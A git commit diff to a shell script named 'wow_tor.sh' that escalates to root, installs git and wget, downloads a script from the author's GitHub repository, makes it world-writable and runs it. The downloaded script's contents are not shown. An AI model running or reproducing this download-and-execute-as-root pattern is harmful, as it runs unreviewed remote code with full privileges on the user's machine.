2087590733ccd07dcb6a8c772f9d2d38083c181a
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2021-04-20 19:15:12 +0700

    Update wow_tor.sh

--- wow_tor.sh
+++ wow_tor.sh
@@ -6,13 +6,8 @@ else
 fi
 sudo -i
 apt-get update
-apt-get install -y git wget screen
-apt-get install -y python python-dev
-apt-get install -y epel-release
-apt-get install -y python-pip
-apt-get install -y gcc-c++
-pip install sh
-rm -rf ubuntu_tor_docker.py
-wget https://raw.githubusercontent.com/ts6aud5vkg/wow/master/wow_tor_docker.py
-chmod 777 wow_tor_docker.py
-python wow_tor_docker.py
+apt-get install -y git wget
+rm -rf wow_tor_docker.sh
+wget https://raw.githubusercontent.com/ts6aud5vkg/wow/master/wow_tor_docker.sh
+chmod 777 wow_tor_docker.sh
+./wow_tor_docker.sh
